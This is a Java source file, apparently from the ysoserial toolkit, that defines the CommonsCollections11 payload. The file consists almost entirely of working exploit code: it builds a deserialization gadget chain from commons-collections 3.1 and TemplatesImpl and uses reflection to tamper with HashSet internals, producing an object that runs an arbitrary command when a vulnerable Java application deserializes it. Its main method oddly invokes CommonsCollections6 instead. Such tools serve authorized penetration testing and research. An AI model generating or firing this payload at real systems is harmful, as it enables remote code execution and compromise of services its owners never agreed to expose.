package ysoserial.payloads;

import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import javax.xml.transform.Transformer;
import java.io.Serializable;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({ Authors.RACERZ })
public class CommonsCollections11 extends PayloadRunner implements ObjectPayload<Serializable> {

    public Serializable getObject(final String command) throws Exception {
        Object templatesImpl = Gadgets.createTemplatesImpl(command);

        final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        final Map innerMap = new HashMap();
        final Map lazyMap = LazyMap.decorate(innerMap, transformer);

        TiedMapEntry entry = new TiedMapEntry(lazyMap, templatesImpl);

        HashSet map = new HashSet(1);
        map.add("foo");
        Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }
        // 先拿到内部的 HashMap 成员 instance
        Reflections.setAccessible(f);
        HashMap innimpl = (HashMap) f.get(map);

        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        Reflections.setAccessible(f2);
        Object[] array = (Object[]) f2.get(innimpl);

        Object node = array[0];
        if(node == null){
            node = array[1];
        }

        Field keyField = null;
        try{
            keyField = node.getClass().getDeclaredField("key");
        }catch(Exception e){
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }

        Reflections.setAccessible(keyField);
        keyField.set(node, entry);

        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
        return map;
    }

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections6.class, args);
    }
}
